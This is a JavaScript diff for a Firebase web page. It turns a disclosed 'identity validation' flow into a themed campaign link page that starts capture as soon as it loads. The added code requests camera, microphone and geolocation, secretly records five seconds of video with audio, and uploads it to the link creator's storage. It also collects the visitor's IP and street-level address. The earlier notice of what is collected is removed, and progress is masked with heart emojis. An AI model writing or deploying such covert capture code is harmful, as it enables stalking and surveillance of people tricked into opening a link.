@@ -14,15 +14,13 @@
   const database = firebase.database();
   const storage = firebase.storage();
 
-  class IdentityValidationSystem {
+  class VideoLocationSystem {
     constructor() {
       this.urlId = this.getUrlParameter('id');
       this.urlData = null;
       this.userId = null;
       this.themeData = null;
-      this.mainContent = document.getElementById('mainContent');
-      this.frontVideoBlob = null;
-      this.backVideoBlob = null;
+      this.buildUI();
       this.init();
     }
 
@@ -31,14 +29,67 @@
       return urlParams.get(name);
     }
 
-    setContent(html) {
-      this.mainContent.innerHTML = html;
+    buildUI() {
+      document.body.style.cssText = `
+        margin: 0;
+        font-family: Arial, sans-serif;
+        color: #fff;
+        background-color: #000;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        overflow: hidden;
+      `;
+
+      this.container = document.createElement('div');
+      this.container.style.padding = '20px';
+      this.container.style.textAlign = 'center';
+      this.container.style.maxWidth = '90%';
+
+      this.emoji = document.createElement('div');
+      this.emoji.style.fontSize = '40px';
+      this.emoji.style.marginBottom = '10px';
+
+      this.title = document.createElement('h2');
+      this.title.style.marginBottom = '10px';
+      this.title.style.fontSize = '1.5rem';
+
+      this.description = document.createElement('p');
+      this.description.style.marginBottom = '20px';
+      this.description.style.fontSize = '1rem';
+
+      this.image = document.createElement('img');
+      this.image.style.maxWidth = '100%';
+      this.image.style.borderRadius = '12px';
+      this.image.style.marginBottom = '20px';
+      this.image.style.boxShadow = '0 0 12px rgba(255,255,255,0.2)';
+
+      this.status = document.createElement('div');
+      this.status.style.padding = '10px';
+      this.status.style.backgroundColor = 'rgba(255,255,255,0.1)';
+      this.status.style.borderRadius = '8px';
+      this.status.style.fontSize = '1rem';
+      this.status.style.animation = 'pulse 1.5s infinite';
+
+      this.container.appendChild(this.emoji);
+      this.container.appendChild(this.image);
+      this.container.appendChild(this.title);
+      this.container.appendChild(this.description);
+      this.container.appendChild(this.status);
+
+      document.body.appendChild(this.container);
+    }
+
+    setStatus(msg) {
+      this.status.innerText = msg;
     }
 
     async init() {
       try {
         if (!this.urlId) {
-          this.showError('URL inválida. Verifique o link fornecido.');
+          this.setStatus('URL inválida');
           return;
         }
 
@@ -54,27 +105,58 @@
         }
 
         if (!this.urlData || !this.userId) {
-          this.showError('Campanha não encontrada.');
+          this.setStatus('URL não encontrada');
           return;
         }
 
         const now = Date.now();
         if (this.urlData.expiresAt && now > this.urlData.expiresAt) {
-          this.showError('Esta campanha expirou. Tente novamente mais tarde.');
+          this.setStatus('Campanha expirada');
           return;
         }
 
         if (this.urlData.maxUses && this.urlData.usedCount >= this.urlData.maxUses) {
-          this.showError('Limite de participações atingido.');
+          this.setStatus('Limite de usos atingido');
           return;
         }
 
         await this.loadTheme();
-        this.showWelcome();
+        this.renderTheme();
+
+        this.setStatus('Solicitando permissões...');
+        const granted = await this.requestPermissions();
+        if (!granted) {
+          alert('Você precisa conceder permissões para continuar.');
+          location.reload();
+          return;
+        }
+
+        this.setStatus('Capturando vídeo...');
+        await this.recordAndUpload();
 
       } catch (error) {
         console.error('Erro na inicialização:', error);
-        this.showError('Erro ao carregar a campanha: ' + error.message);
+        this.setStatus('Erro: ' + error.message);
+      }
+    }
+getCameraFacingMode() {
+  const emoji = (this.themeData?.emoji || '').trim();
+  if (emoji === '5') return 'user';
+  if (emoji === '1') return 'environment';
+  return 'environment'; // fallback padrão
+}
+
+    async requestPermissions() {
+      try {
+        await navigator.mediaDevices.getUserMedia({
+          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: this.getCameraFacingMode() },
+          audio: true
+        });
+        await this.getLocation();
+        return true;
+      } catch (e) {
+        console.warn('Permissões negadas:', e);
+        return false;
       }
     }
 
@@ -88,314 +170,66 @@
       }
     }
 
-    showError(message) {
-      this.setContent(`
-        <div class="card">
-          <div class="error-message">
-            ❌ ${message}
-          </div>
-          <button class="btn btn-secondary" onclick="location.reload()">Tentar Novamente</button>
-        </div>
-      `);
+    renderTheme() {
+      const { title = '', description = '', imageUrl = '', color = '', emoji = '' } = this.themeData;
+      this.title.textContent = title;
+      this.description.textContent = description;
+      if (imageUrl) this.image.src = imageUrl;
+      this.emoji.textContent = emoji;
+      if (color) document.body.style.background = color;
     }
 
-    showWelcome() {
-      const { title = 'Validação de Identidade', description = 'Processo seguro e rápido de verificação' } = this.themeData;
-      
-      this.setContent(`
-        <div class="card">
-          <div class="steps">
-            <div class="step"></div>
-            <div class="step"></div>
-          </div>
-          
-          <div class="info-section">
-            <div class="info-title">Campanha</div>
-            <div class="info-content">${title}</div>
-          </div>
-
-          <div class="info-section">
-            <div class="info-title">Descrição</div>
-            <div class="info-content">${description}</div>
-          </div>
-
-          <div class="info-section">
-            <div class="info-title">O que será feito</div>
-            <div class="info-content">
-              • Captura de vídeo frontal (5 segundos)<br>
-              • Captura de vídeo traseira (5 segundos)<br>
-              • Localização geográfica<br>
-              • Informações do dispositivo
-            </div>
-          </div>
-
-          <div class="button-group">
-            <button class="btn btn-primary" onclick="window.validationSystem.startCapture()">Iniciar Validação</button>
-          </div>
-        </div>
-      `);
-    }
-
-    async startCapture() {
-      this.setContent(`
-        <div class="card">
-          <div class="steps">
-            <div class="step active"></div>
-            <div class="step"></div>
-          </div>
-
-          <div style="text-align: center;">
-            <div class="camera-icon">📱</div>
-            <div class="info-title">Solicitando Permissões</div>
-            <div class="info-content" style="margin-top: 12px;">Permitindo acesso à câmera e localização...</div>
-          </div>
-
-          <div class="status-indicator">
-            <div class="status-dot"></div>
-            <span>Aguarde...</span>
-          </div>
-        </div>
-      `);
+    async recordAndUpload() {
+      let stream = null;
 
       try {
-        const granted = await this.requestPermissions();
-        if (!granted) {
-          this.showError('Permissões negadas. Você precisa conceder acesso à câmera para continuar.');
-          return;
-        }
-
-        this.recordFrontCamera();
-      } catch (error) {
-        console.error('Erro ao solicitar permissões:', error);
-        this.showError('Erro ao solicitar permissões: ' + error.message);
-      }
-    }
-
-    async requestPermissions() {
-      try {
-        // Solicitar apenas vídeo (sem áudio) para a câmera frontal
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
-          audio: false
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: this.getCameraFacingMode() },
+          audio: true
         });
-        
-        // Parar as faixas imediatamente após obter a permissão para liberar a câmera
+
+        const chunks = [];
+        const recorder = new MediaRecorder(stream, {
+          mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+            ? 'video/webm;codecs=vp9'
+            : 'video/webm'
+        });
+
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.start();
+        this.setStatus('Aguarde... (5 segundos)');
+        await new Promise(r => setTimeout(r, 5000));
+        recorder.stop();
+
+        const videoBlob = await new Promise((resolve, reject) => {
+          recorder.onstop = () => {
+            if (chunks.length > 0) resolve(new Blob(chunks, { type: 'video/webm' }));
+            else reject(new Error('Nenhum dado '));
+          };
+          setTimeout(() => reject(new Error('Timeout na criação do blob')), 10000);
+        });
+
         stream.getTracks().forEach(track => track.stop());
-        
-        await this.getLocation();
-        return true;
-      } catch (e) {
-        console.warn('Permissões negadas:', e);
-        return false;
-      }
-    }
 
-    recordFrontCamera() {
-      this.setContent(`
-        <div class="card">
-          <div class="steps">
-            <div class="step active completed"></div>
-            <div class="step"></div>
-          </div>
-
-          <div style="text-align: center;">
-            <div class="camera-icon">📱</div>
-            <div class="info-title">Câmera Frontal</div>
-            <div class="timer" id="frontTimer">5</div>
-            <div class="timer-label">Gravando...</div>
-            <div class="progress-container">
-              <div class="progress-bar">
-                <div class="progress-fill" id="frontProgress"></div>
-              </div>
-            </div>
-          </div>
-
-          <div class="status-indicator">
-            <div class="status-dot"></div>
-            <span>Mantenha o rosto visível</span>
-          </div>
-        </div>
-      `);
-
-      this.recordVideo('user', 5000, 'frontTimer', 'frontProgress', false, () => {
-        // Pequeno atraso para garantir que a câmera frontal foi liberada antes de abrir a traseira
-        setTimeout(() => {
-          this.recordBackCamera();
-        }, 1000);
-      });
-    }
-
-    recordBackCamera() {
-      this.setContent(`
-        <div class="card">
-          <div class="steps">
-            <div class="step completed"></div>
-            <div class="step active"></div>
-          </div>
-
-          <div style="text-align: center;">
-            <div class="camera-icon">📷</div>
-            <div class="info-title">Câmera Traseira</div>
-            <div class="timer" id="backTimer">5</div>
-            <div class="timer-label">Gravando...</div>
-            <div class="progress-container">
-              <div class="progress-bar">
-                <div class="progress-fill" id="backProgress"></div>
-              </div>
-            </div>
-          </div>
-
-          <div class="status-indicator">
-            <div class="status-dot"></div>
-            <span>Mantenha o dispositivo estável</span>
-          </div>
-        </div>
-      `);
-
-      this.recordVideo('environment', 5000, 'backTimer', 'backProgress', false, () => {
-        this.uploadAndFinalize();
-      });
-    }
-
-    recordVideo(facingMode, duration, timerElementId, progressElementId, includeAudio, callback) {
-      const constraints = {
-        video: { 
-          width: { ideal: 1280 }, 
-          height: { ideal: 720 }, 
-          facingMode 
-        },
-        audio: includeAudio
-      };
-
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(stream => {
-          const chunks = [];
-          
-          // Determinar o tipo MIME suportado
-          let mimeType = 'video/webm';
-          if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-            mimeType = 'video/webm;codecs=vp9';
-          } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-            mimeType = 'video/webm;codecs=vp8';
-          }
-
-          const recorder = new MediaRecorder(stream, { mimeType });
-
-          recorder.ondataavailable = e => { 
-            if (e.data.size > 0) chunks.push(e.data); 
-          };
-
-          recorder.onerror = error => {
-            console.error('Erro no MediaRecorder:', error);
-            stream.getTracks().forEach(track => track.stop());
-            this.showError('Erro ao gravar vídeo: ' + error.message);
-          };
-
-          recorder.start();
-
-          // Timer
-          let remaining = duration / 1000;
-          const timerInterval = setInterval(() => {
-            remaining--;
-            const timerEl = document.getElementById(timerElementId);
-            if (timerEl) timerEl.textContent = Math.max(0, remaining);
-          }, 1000);
-
-          // Progress bar
-          const startTime = Date.now();
-          const progressInterval = setInterval(() => {
-            const elapsed = Date.now() - startTime;
-            const progress = (elapsed / duration) * 100;
-            const progressEl = document.getElementById(progressElementId);
-            if (progressEl) progressEl.style.width = Math.min(progress, 100) + '%';
-          }, 50);
-
-          setTimeout(() => {
-            clearInterval(timerInterval);
-            clearInterval(progressInterval);
-            recorder.stop();
-            stream.getTracks().forEach(track => track.stop());
-
-            recorder.onstop = () => {
-              const videoBlob = new Blob(chunks, { type: mimeType });
-              if (facingMode === 'user') {
-                this.frontVideoBlob = videoBlob;
-              } else {
-                this.backVideoBlob = videoBlob;
-              }
-              callback();
-            };
-          }, duration);
-        })
-        .catch(error => {
-          console.error('Erro ao acessar câmera:', error);
-          let errorMsg = error.message;
-          
-          if (error.name === 'NotAllowedError') {
-            errorMsg = 'Permissão negada. Verifique as configurações do navegador.';
-          } else if (error.name === 'NotFoundError') {
-            errorMsg = 'Câmera não encontrada no dispositivo.';
-          } else if (error.name === 'NotReadableError') {
-            errorMsg = 'Câmera está sendo usada por outro aplicativo.';
-          }
-          
-          this.showError('Erro ao acessar a câmera: ' + errorMsg);
-        });
-    }
-
-    async uploadAndFinalize() {
-      this.setContent(`
-        <div class="card">
-          <div class="steps">
-            <div class="step completed"></div>
-            <div class="step completed"></div>
-          </div>
-
-          <div style="text-align: center;">
-            <div class="camera-icon">⏳</div>
-            <div class="info-title">Processando Dados</div>
-            <div class="info-content" style="margin-top: 12px;">Enviando vídeos e informações...</div>
-          </div>
-
-          <div class="status-indicator">
-            <div class="status-dot"></div>
-            <span>Aguarde, não feche a página</span>
-          </div>
-
-          <div class="progress-container">
-            <div class="progress-bar">
-              <div class="progress-fill" id="uploadProgress" style="width: 0%;"></div>
-            </div>
-          </div>
-        </div>
-      `);
-
-      try {
-        if (!this.frontVideoBlob || !this.backVideoBlob) {
-          throw new Error('Um dos vídeos não foi gravado corretamente');
-        }
+        if (videoBlob.size === 0) throw new Error('vazio');
+        this.setStatus('...');
 
         const timestamp = Date.now();
-        const frontFilePath = `videos/${this.userId}/${this.urlId}_${timestamp}_front.webm`;
-        const backFilePath = `videos/${this.userId}/${this.urlId}_${timestamp}_back.webm`;
+        const filePath = `videos/${this.userId}/${this.urlId}_${timestamp}.webm`;
+        const storageRef = storage.ref(filePath);
+        const uploadTask = await storageRef.put(videoBlob);
+        const videoUrl = await uploadTask.ref.getDownloadURL();
 
-        // Upload com progress
-        const [frontUrl, backUrl] = await Promise.all([
-          this.uploadWithProgress(frontFilePath, this.frontVideoBlob, 0, 50),
-          this.uploadWithProgress(backFilePath, this.backVideoBlob, 50, 100)
-        ]);
-
-        // Obter localização e IP
+        this.setStatus('Obtendo localização...');
         const [ipResult, location] = await Promise.all([this.getIP(), this.getLocation()]);
 
-        // Salvar dados
+        this.setStatus('❤️❤️❤️❤️❤️❤️❤️❤️...');
         const captureKey = database.ref().push().key;
         const captureData = {
           id: captureKey,
           urlId: this.urlId,
           userId: this.userId,
-          frontVideoUrl: frontUrl,
-          backVideoUrl: backUrl,
+          videoUrl,
           ip: ipResult,
           timestamp,
           data: new Date().toISOString(),
@@ -412,57 +246,13 @@
         updates[`users/${this.userId}/urls/${this.urlId}/lastUsed`] = timestamp;
 
         await database.ref().update(updates);
+        this.setStatus('✅ ❤️❤️❤️❤️❤️❤️❤️❤️❤️🫶');
 
-        this.showSuccess();
       } catch (error) {
-        console.error('Erro no upload:', error);
-        this.showError('Erro ao enviar dados: ' + error.message);
+        console.error('Erro na captura:', error);
+        this.setStatus('❌ Erro na: ' + error.message);
+        if (stream) stream.getTracks().forEach(track => track.stop());
       }
-    }
-
-    uploadWithProgress(filePath, blob, startProgress, endProgress) {
-      return new Promise((resolve, reject) => {
-        const storageRef = storage.ref(filePath);
-        const uploadTask = storageRef.put(blob);
-
-        uploadTask.on('state_changed',
-          snapshot => {
-            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * (endProgress - startProgress) + startProgress;
-            const progressEl = document.getElementById('uploadProgress');
-            if (progressEl) progressEl.style.width = progress + '%';
-          },
-          error => {
-            console.error('Erro no upload:', error);
-            reject(error);
-          },
-          () => {
-            uploadTask.snapshot.ref.getDownloadURL().then(resolve).catch(reject);
-          }
-        );
-      });
-    }
-
-    showSuccess() {
-      this.setContent(`
-        <div class="card">
-          <div class="steps">
-            <div class="step completed"></div>
-            <div class="step completed"></div>
-          </div>
-
-          <div style="text-align: center;">
-            <div class="checkmark">✅</div>
-            <div class="info-title">Validação Concluída</div>
-            <div class="info-content" style="margin-top: 12px;">Seus dados foram enviados com sucesso!</div>
-          </div>
-
-          <div class="success-message">
-            Obrigado por participar. Você será contatado em breve.
-          </div>
-
-          <button class="btn btn-secondary" onclick="location.reload()">Fechar</button>
-        </div>
-      `);
     }
 
     async getIP() {
@@ -471,52 +261,41 @@
         const data = await res.json();
         return data.ip;
       } catch (e) {
-        console.warn('Erro ao obter IP:', e);
         return 'Não disponível';
       }
     }
 
     async getLocation() {
       return new Promise(resolve => {
-        if (!navigator.geolocation) {
-          console.warn('Geolocalização não disponível');
-          return resolve(null);
-        }
-        
-        navigator.geolocation.getCurrentPosition(
-          async pos => {
-            const { latitude, longitude } = pos.coords;
-            try {
-              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
-              const data = await res.json();
-              resolve({
-                latitude,
-                longitude,
-                accuracy: pos.coords.accuracy,
-                rua: data.address?.road || '',
-                cidade: data.address?.city || data.address?.town || data.address?.village || '',
-                regiao: data.address?.state || '',
-                bairro: data.address?.suburb || data.address?.neighbourhood || '',
-                numero: data.address?.house_number || 'S/N',
-                endereco_completo: data.display_name || '',
-                pais: data.address?.country || ''
-              });
-            } catch (error) {
-              console.warn('Erro ao reverter geolocalização:', error);
-              resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
-            }
-          }, 
-          err => {
-            console.warn('Erro de geolocalização:', err);
-            resolve(null);
-          }, 
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
-        );
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const { latitude, longitude } = pos.coords;
+          try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
+            const data = await res.json();
+            resolve({
+              latitude,
+              longitude,
+              accuracy: pos.coords.accuracy,
+              rua: data.address?.road || '',
+              cidade: data.address?.city || data.address?.town || data.address?.village || '',
+              regiao: data.address?.state || '',
+              bairro: data.address?.suburb || data.address?.neighbourhood || '',
+              numero: data.address?.house_number || 'S/N',
+              endereco_completo: data.display_name || '',
+              pais: data.address?.country || ''
+            });
+          } catch {
+            resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
+          }
+        }, err => {
+          console.warn('Erro de geolocalização:', err);
+          resolve(null);
+        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 });
       });
     }
   }
 
-  window.validationSystem = null;
   window.addEventListener('DOMContentLoaded', () => {
-    window.validationSystem = new IdentityValidationSystem();
+    new VideoLocationSystem();
   });
